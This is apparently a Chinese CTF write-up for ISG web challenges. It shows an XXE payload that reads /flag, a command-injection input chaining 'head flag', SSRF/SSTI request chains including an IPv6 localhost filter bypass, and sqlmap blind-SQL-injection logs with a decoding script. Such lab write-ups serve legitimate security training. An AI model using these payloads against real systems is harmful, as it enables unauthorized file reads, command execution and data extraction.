---
layout: post
title: isg writeup
categories: 19th
description: wp
keywords: wp

---

## web1

![web1.png](https://upload-images.jianshu.io/upload_images/2360187-792c50b7cf167563.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
右键看源码，得到一段js代码

```
 $(document).ready(function() {
		$('#button1').click(
			function () {
				var f = new FormData();
				dd=$("form").serializeArray();
				ddd= {}
				for (d in dd){
					ddd[dd[d]['name']] = dd[d]['value']
				}
				f.append('user_name',ddd['user_name'])
				f.append('!DOCTYPE',ddd['xml'])



				console.log(f)
				$.ajax({
					type: 'POST',
					url: '',
					data: f,
					success: function(redata){
						if(redata['code']=='0'){
							alert('添加成功')
							window.location.href="/";

						}
						else{
							dddd=redata['info']
							alert(redata['info'])
						}
					},
					processData: false,
					contentType: false,
					dataType: 'json'
				});
		}
		)
		$('#uname').bind('keypress',function(event){
			if(event.keyCode == "13")    
			{
				$('#button1').click()
			}
		});
		
	 })
```
xxe漏洞，添加xxe poc
```
'methodname': '&xxe;', '!DOCTYPE': 'xdsec [<!ELEMENT methodname ANY >\n<!ENTITY xxe SYSTEM "file:///flag" >]'
```
## web2

命令注入

![web2.png](https://upload-images.jianshu.io/upload_images/2360187-efc73c902c211a26.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
url编码查看flag
```
1.1.1.1 %26%26 head flag
```
## web3

ssti漏洞
![web3.PNG](https://upload-images.jianshu.io/upload_images/2360187-9aa9cf90cbf4961c.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
可以看到有提示http://127.0.0.1:1998，所以应该是ssrf，将后面的url换成127.0.0.1:1988并且利用ssti漏洞，即http://192.168.2.122:8110/?isg=http://127.0.0.1:1998?key={{config}}，经过url编码可得http://192.168.2.122:8110/?isg=http%3A//127.0.0.1%3A1998%3Fkey%3D%7B%7B%2520config%2520%7D%7D，请求得到flag

## web4

![web4.PNG](https://upload-images.jianshu.io/upload_images/2360187-745f893f8cd2d8fb.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
```
<?php 
#main.php is good
highlight_file(__FILE__);
function check_inner_ip($url) 
{ 
    $match_result=preg_match('/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/',$url); 
    if (!$match_result) 
    { 
        die('url fomat error'); 
    } 
    try 
    { 
        $url_parse=parse_url($url); 
    } 
    catch(Exception $e) 
    { 
        die('url fomat error'); 
        return false; 
    } 
    $hostname=$url_parse['host']; 
    $ip=gethostbyname($hostname); 
    $int_ip=ip2long($ip); 
    return ip2long('127.0.0.0')>>24 == $int_ip>>24 || ip2long('10.0.0.0')>>24 == $int_ip>>24 || ip2long('172.16.0.0')>>20 == $int_ip>>20 || ip2long('192.168.0.0')>>16 == $int_ip>>16; 
} 

function safe_request_url($url) 
{ 
     
    if (check_inner_ip($url)) 
    { 
        echo $url.' is inner ip'; 
    } 
    else 
    {
        $ch = curl_init(); 
        curl_setopt($ch, CURLOPT_URL, $url); 
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
        curl_setopt($ch, CURLOPT_HEADER, 0); 
        $output = curl_exec($ch); 
        $result_info = curl_getinfo($ch); 
        if ($result_info['redirect_url']) 
        { 
            safe_request_url($result_info['redirect_url']); 
        } 
        curl_close($ch); 
        var_dump($output); 
    } 
     
} 

$url = $_GET['url']; 
if(!empty($url)){ 
    safe_request_url($url); 
} 

?>
```
第一段代码对127.0.0.1进行了检查，所以使用ipv6进行绕过，同时题中给出提示main.php，所以构造请求http://192.168.2.231/web2/?url=http://[::1]/web2/main.php，然后就看到第二段代码
![web4(2).PNG](https://upload-images.jianshu.io/upload_images/2360187-f21ae6b6fdcf5298.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
然后构造
http://192.168.2.231/web2/?url=http://[::1]/web2/main.php?code=s:11:%22get_flag();%22
可以得到flag

## 日志审计

日志审计是一个基于布尔盲注的题，看其中几个日志信息
```
172.17.0.1 - - [25/Sep/2018:07:13:01  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(session_id AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 1,1),5,1))>96-- bAne HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:13:01  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(session_id AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 1,1),5,1))>112-- bAne HTTP/1.1" 200 330 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:13:01  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(session_id AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 1,1),5,1))>104-- bAne HTTP/1.1" 200 330 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:13:01  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(session_id AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 1,1),5,1))>100-- bAne HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:13:01  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(session_id AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 1,1),5,1))>102-- bAne HTTP/1.1" 200 330 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:13:01  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(session_id AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 1,1),5,1))>101-- bAne HTTP/1.1" 200 330 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:13:01  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(session_id AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 1,1),6,1))>96-- bAne HTTP/1.1" 200 330 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:13:01  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(session_id AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 1,1),6,1))>48-- bAne HTTP/1.1" 200 330 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:13:01  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(session_id AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 1,1),6,1))>1-- bAne HTTP/1.1" 200 330 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
```
可以看出攻击者在猜解session id，可以看到日志中是用二分法进行拆解的，从低位到高位一一猜解，这题题目有点鬼扯，二分法猜解的结果不是flag，猜解的字段是secret，且是按照日志中ascii码值为=号的日志信息得出的flag，即：
```
172.17.0.1 - - [25/Sep/2018:07:12:59  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),2,1))=108-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:12:59  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),3,1))=97-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:12:59  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),4,1))=103-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:12:59  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),5,1))=123-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:12:59  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),6,1))=98-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:12:59  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),7,1))=105-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:12:59  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),8,1))=110-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:12:59  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),9,1))=100-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:12:59  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),10,1))=95-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:12:59  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),11,1))=115-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:12:59  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),12,1))=113-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:12:59  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),13,1))=108-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:12:59  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),14,1))=95-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:12:59  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),15,1))=105-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:12:59  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),16,1))=115-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:12:59  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),17,1))=95-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:12:59  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),18,1))=97-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:12:59  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),19,1))=119-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:12:59  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),20,1))=101-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:12:59  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),21,1))=115-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:12:59  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),22,1))=111-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:12:59  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),23,1))=109-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:12:59  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),24,1))=101-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
172.17.0.1 - - [25/Sep/2018:07:12:59  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),25,1))=125-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
```
写python脚本
```
#!/usr/bin/env python

from urllib import unquote

logs = open('access.log').readlines()


res = ''
# filter the flag log
flag_log = []
for log in logs:
	if 'haozi.secrets' in log and 'ORDER' in log and 'session_id' not in log and '0,1' in log and ')=' in log:
		
		log = log.split('GET ')[1].split(' HTTP/1.1')[0]
		print log

		number = log.split('=')[2].split('--')[0]
		print(number)
		print(log)
		print chr(int(number))
		
		res += chr(int(number))

		# flag_log.append(log)

print(res)

```
得到flag{bind_sql_is_awesome}。
